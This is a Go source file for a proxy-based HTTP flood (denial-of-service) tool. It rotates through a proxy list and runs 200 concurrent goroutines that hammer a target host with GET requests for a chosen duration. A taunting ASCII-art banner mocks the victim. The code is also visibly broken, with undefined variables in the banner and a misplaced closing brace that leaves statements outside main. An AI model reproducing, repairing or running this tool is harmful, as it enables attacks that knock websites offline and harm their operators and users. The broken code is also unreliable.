package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	STOP            bool
	showResponseCode bool
)

func main() {
	duration, _ := strconv.Atoi(os.Args[3])
	showResponseCodePtr := flag.Bool("showResponseCode", true, "Show response code (true/false)")
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s [options] host port duration\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
	}
	flag.Parse()

	showResponseCode = *showResponseCodePtr

	if len(flag.Args()) != 3 {
		flag.Usage()
		os.Exit(1)
	}
    
	banner := fmt.Sprintf(`
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣠⣤⣴⡶⠶⠾⠿⠛⠛⠛⠛⠿⠿⠶⢶⣦⣤⣄⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⡶⠟⠛⠉⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠛⠻⢶⣤⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣴⠾⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠙⠷⣦⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣠⡼⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠙⢷⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⣠⡾⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢷⣄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⣀⡾⠏⠄⠄⠄⠄⢀⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⡀⠄⠄⠄⠄⠹⢷⣀⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⢀⣼⠏⠄⠄⠄⡀⣰⣾⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⣷⣦⢀⠄⠄⠄⠹⣷⡀⠄⠄⠄⠄
⠄⠄⠄⠄⡾⠃⠄⢀⣴⠋⣴⣿⢋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡙⣿⣦⠙⣦⡀⠄⠘⢷⡄⠄⠄⠄
⠄⠄⠄⣼⠁⠄⢀⣿⡏⢰⠟⢡⡎⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⡠⣤⣀⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢱⣌⠻⡇⢹⣿⡀⠄⠈⢧⠄⠄⠄
⠄⠄⣼⠏⣠⡎⢸⣿⢣⣥⡾⠏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠿⠄⠈⣿⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢷⣬⣜⣿⡇⢱⣄⠸⣧⠄⠄
⠄⣸⡟⠄⣿⡇⢸⣷⡿⢋⡔⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⡼⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢢⡙⢿⣾⡇⢸⣿⡀⢻⣇⠄
⢀⣿⠁⠄⣿⣧⠸⢋⣴⡿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣦⡙⠇⣸⣿⡇⠈⣿⡀
⢸⡏⠄⡄⣿⡿⣰⣿⡿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⡿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⣆⢻⣿⢣⠄⢹⡇
⣾⡇⢠⣧⠹⣧⡿⠋⣰⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠄⠠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣦⠙⢿⣼⠏⢸⡄⢸⣿
⣿⠄⠘⣿⡀⢻⢁⣼⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣴⠄⠛⢿⡿⠛⠄⣲⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣧⡈⡿⢀⣾⠃⠄⣿
⣿⠄⠄⢿⣷⠄⣾⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣿⡏⠄⠠⢻⡟⠄⠄⢹⣿⣶⣦⣤⣤⣀⣀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣿⣷⠄⣾⡿⠄⠄⣿
⢿⡇⢰⠘⣿⡇⣿⡏⢸⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⣼⣧⠄⠄⢈⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⢀⡇⢹⣿⢸⣿⠇⡆⢸⡿
⢸⣇⠈⣷⠈⢻⣿⠄⣼⣇⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⣿⣿⣿⣿⣿⣿⣧⠄⠄⣿⣿⠄⠄⣼⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⣸⣧⠄⣿⡟⠁⣼⠁⣸⡇
⠈⣿⡀⠹⣷⣄⠙⠄⣿⣿⢀⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⣿⣿⠄⣰⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⡀⣿⣿⠄⠋⣠⣾⡏⢀⣿⠁
⠄⢹⣧⠄⠻⣿⣷⡄⣿⣿⠄⣇⠄⠄⠄⠄⠄⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄⠄⣠⠄⣿⣿⢠⣾⣿⠟⠄⣼⡏⠄
⠄⠄⢻⣆⠡⣈⠻⠿⣞⣿⡄⢸⣆⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⣰⣿⢠⣿⣳⠿⠟⣁⠌⢰⡿⠄⠄
⠄⠄⠄⢻⡀⠹⣷⣦⣀⠙⠳⣸⣿⣇⢀⡀⠄⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⢀⡀⣸⣿⡏⠞⠋⣀⣴⣾⠏⢀⡞⠄⠄⠄
⠄⠄⠄⠄⢷⡄⠈⠻⢿⣿⣷⣆⡻⣿⡄⢻⣦⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣴⡟⢠⣿⢟⣠⣾⣿⡿⠟⠁⢠⡾⠃⠄⠄⠄
⠄⠄⠄⠄⠈⢿⣆⠄⠄⣉⠛⠿⢿⣮⣿⣄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣠⣿⣵⡿⠿⠛⣉⠄⠄⣰⡿⠁⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠙⢷⣄⠈⠓⢦⣤⣤⣤⣭⣥⣭⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣭⣤⣭⣤⣤⣤⡴⠚⠁⣠⡾⠋⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠙⢷⣄⡀⠈⢉⠛⠛⠛⠛⠛⠉⣁⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣈⠉⠙⠛⠛⠛⠛⡉⠁⠄⣠⡾⠋⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢳⣄⡀⠙⠳⢶⣶⣾⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣷⣶⡶⠞⠋⢀⣠⡾⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⠻⢶⣄⡀⠄⠄⠄⠄⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⢀⣠⣶⠟⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠉⠓⠶⣦⣤⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣤⣴⡶⠚⠉⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠙⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠟⠛⠋⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄

Attack Succesfully sent to

IP: %s
PORT: %s
TIME: %s
BOTS: %s
METHOD: %s

HAHAHA %s SUCH LOSER!
GET ATTACKED WITH SIZE %s PROXY

`, target, port, duration, proxies, target, proxies, method)

    fmt.Println(banner)
}

	go timer(duration)

	proxies, err := loadProxies("proxy.txt")
	if err != nil {
		fmt.Println("Error loading proxies:", err)
		return
	}

	for i := 0; i < 200; i++ {
		go RAWFLOOD(flag.Arg(0)+":"+flag.Arg(1), proxies)
		time.Sleep(200 * time.Millisecond)
	}
	time.Sleep(time.Duration(duration) * time.Second)
}

func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxies, nil
}

func timer(duration int) {
	time.Sleep(time.Duration(duration) * time.Second)
	STOP = true
}

func RAWFLOOD(target string, proxies []string) {
	site, _ := url.Parse(target)
	path := strings.Replace(site.Path, ":"+strings.Split(target, ":")[2], "", -1)

	for _, proxy := range proxies {
		restart:
		if STOP == true {
			os.Exit(0)
		}
		
		proxyURL, err := url.Parse("http://" + proxy)
		if err != nil {
			fmt.Println("Error parsing proxy:", err)
			continue
		}
		
		client := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			},
			Timeout: 5 * time.Second,
		}
		
		req, err := http.NewRequest("GET", "https://"+site.Host+path, nil) 
		if err != nil {
			fmt.Println("Error creating request:", err)
			continue
		}
		
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br") 
		
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			goto restart
		}
		defer resp.Body.Close()

		if showResponseCode {
			fmt.Println("Response Code:", resp.StatusCode)
		}
	}
}







